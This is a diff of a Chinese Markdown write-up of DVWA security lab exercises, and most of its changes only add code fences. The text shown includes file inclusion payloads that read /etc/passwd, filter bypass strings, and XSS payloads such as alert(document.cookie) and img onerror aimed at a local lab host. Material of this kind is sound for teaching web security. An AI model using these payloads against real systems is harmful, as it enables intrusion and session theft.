@@ -276,21 +276,22 @@ $file = $_GET[ 'page' ];
 ```
 
 文件包含漏洞的一般特征如下：
-
+```
 ?page=a.php
 
 ?home=a.html
 
 ?file=content
-
+```
 几种经典的测试方法：
-
+```
 ?file=../../../../../etc/passwdd
 ?page=file:///etc/passwd
 ?home=main.cgi
 ?page=http://www.a.com/1.php
 =http://1.1.1.1/../../../../dir/file.txt
 （通过多个../可以让目录回到根目录中然后再进入目标目录）
+```
 
 ## medium模式
 增加对绝对路径http和相对路径的检查
@@ -301,9 +302,9 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 ```
 但依然可以使用?page=file:///etc/passwd
 以及重复字符过滤方法,构造url
-1. 构造url为httphttp://  --> http
-2. 构造url为httphttp://://  -->http://
-3. 构造url为..././   -->  ../
+1. 构造url为   httphttp://  --> http
+2. 构造url为   httphttp://://  -->http://
+3. 构造url为   ..././   -->  ../
 
 # 文件上传
 ## easy模式
@@ -459,7 +460,7 @@ Surname: Smith
 4.猜解表中的字段名
 5.猜解数据
 
-```
+```php
 <?php
 
 if( isset( $_GET[ 'Submit' ] ) ) {
@@ -502,7 +503,7 @@ https://www.jianshu.com/p/ec2ca79e74b2
 session-ID通常是在登录后作为特定用户访问站点所需的唯一内容，如果能够计算或轻易猜到该会话ID，则攻击者将有一种简单的方法来获取访问权限。无需知道账户密码或查找其他漏洞，如跨站点脚本。
 
 根据源码可以看出来session每次加1
-```
+```php
 <?php
 
 $html = "";
@@ -542,7 +543,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 > 基于DOM的XSS是一个特殊情况，反映了JavaScript隐藏在URL中并在呈现时由页面中的JavaScript拉出而不是在服务时嵌入页面中。这可能使其比其他攻击更隐蔽，并且正在阅读页面主体的WAF或其他保护措施看不到任何恶意内容。
 
 查看页面源代码
-```
+```script
 
 				<script>
 					if (document.location.href.indexOf("default=") >= 0) {
@@ -580,7 +581,7 @@ url中有一个字符为#，该字符后的数据不会发送到服务器端，�
 `http://192.168.31.84:81/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>`
 2. 方法2
 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接(通过加载一个不存在的图片出错出发javascript onerror事件,继续弹框，证明出来有xss)
-`http://192.168.31.84:81/vulnerabilities/xss_d/?default=English%3E/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(/xss/)%3E'
+```http://192.168.31.84:81/vulnerabilities/xss_d/?default=English%3E/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(/xss/)%3E```
 
 # 反射型xss
 ## easy模式
@@ -610,13 +611,14 @@ http://192.168.31.84:81/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27xss%27)
     $name = str_replace( '<script>', '', $_GET[ 'name' ] );
 ```
 str_replace这个函数是不区分大小写的，而且只替换一次
-改成大写就可以了<SCRIPT>alert('xss')</script>
-或者嵌套<scr<script>ipt>alert('xss')</script>
+改成大写就可以了``<SCRIPT>alert('xss')</script>``
+或者嵌套``<scr<script>ipt>alert('xss')</script>``
 
 但对name审查没有这么严格，同样可以采用嵌套或大小写的方法：
+```
 <scr<script>ipt>alert('fuck')</script>
 <SCRIPT>alert('fuck')</script>
-
+```
 
 
 # 存储型xss
@@ -630,7 +632,7 @@ str_replace这个函数是不区分大小写的，而且只替换一次
 
 查看源码
 trim是去除掉用户输入内容前后的空格。stripslashes是去除反斜杠，两个只会去除一个。mysqli_real_escap_string过滤掉内容中特殊字符，像x00,n,r,,',",x1a等，来预防数据库攻击。
-```
+```php
 <?php
 
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -662,11 +664,11 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 ## medium模式
 源码中增加了几个函数的使用：
+```
 *  $message = strip_tags(addslashes($message)); 剥去字符串中的 HTML、XML 以及 PHP 的标签。
 * $message = htmlspecialchars( $message ); 把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体：
 *  $name = str_replace( '<script>', '', $name );
-
-
+```
 
 # 绕过安全策略
 ## easy模式
@@ -674,7 +676,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 > 这些漏洞都不是CSP中的实际漏洞，它们是实施漏洞的漏洞。
 >
 
-```
+```php
 <?php
 
 $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.
